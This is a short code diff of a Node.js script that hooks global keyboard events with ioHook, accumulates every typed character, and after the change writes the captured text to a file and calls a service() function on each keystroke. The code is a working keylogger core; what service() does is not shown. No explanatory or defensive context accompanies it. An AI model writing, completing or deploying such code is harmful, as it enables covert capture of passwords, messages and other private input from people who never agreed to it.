@@ -11,20 +11,20 @@ const date = new Date();
 ioHook.on("keypress", event => {
     // value += event.keychar==8?'':String.fromCharCode(event.keychar);
 value += String.fromCharCode(event.keychar)
-// run()
-console.log(value)
+run()
 });
 
 ioHook.start();
 
 const run = async()=>{
    await writeFile(FILE_URL,value)
+   await service()
     let time = date.getTime();
     console.log(time)
     // if(time == '6:00'){
     //     service()
     // }
-   await service()
+ 
    
 }
 const start = async()=>{
